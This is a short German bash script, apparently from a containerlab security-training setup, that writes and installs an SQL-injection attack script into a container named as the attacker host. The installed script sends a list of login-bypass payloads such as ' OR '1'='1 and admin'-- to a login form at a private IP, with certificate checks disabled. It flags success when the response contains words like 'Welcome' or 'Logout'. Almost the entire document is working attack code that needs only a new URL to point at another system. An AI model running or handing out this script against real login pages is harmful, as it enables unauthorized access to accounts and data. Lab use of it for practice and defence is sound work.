#!/bin/bash

# Shell-Skript für SQLi-Angriff erstellen
cat << EOF > /tmp/sql_attack_simple.sh
#!/bin/bash

TARGET_URL="https://172.168.3.5:8443/"
VERIFY_SSL="-k"     # Ignoriere Zertifikatsfehler (self-signed)
USERNAME_PARAM="username"
PASSWORD_PARAM="password"

# Typische Payloads
payloads=(
    "' OR '1'='1"
    "' OR 1=1--"
    "' OR ''='"
    "admin'--"
    "' OR 1=1#"
    "' OR 1=1/*"
    "admin' OR '1'='1'--"
)

echo "[+] Starte SQLi-Test gegen \$TARGET_URL"
for payload in "\${payloads[@]}"
do
    echo "[*] Teste Payload: \$payload"
    # Sende POST-Request mit Curl
    response=\$(curl \$VERIFY_SSL -s -X POST "\$TARGET_URL" \
        --data "\${USERNAME_PARAM}=\${payload}&\${PASSWORD_PARAM}=irrelevant")

    # Überprüfe typische Begriffe im Response
    if echo "\$response" | grep -Eq "Report|Welcome|Logout" ; then
        echo "[+] Erfolg mit Payload: \$payload"
    else
        echo "[-] Kein Erfolg mit Payload: \$payload"
    fi

    sleep 1
done
echo "[+] Fertig!"
EOF

chmod +x /tmp/sql_attack_simple.sh

echo "[+] Kopiere SQLi-Angriffsskript in den Attacker-Container..."
sudo docker cp /tmp/sql_attack_simple.sh clab-MaJuVi-Attacker:/root/sql_attack_simple.sh

echo "  Das Skript wurde installiert!"
echo "Führe es im Container aus mit:"
echo "  bash /root/sql_attack_simple.sh"
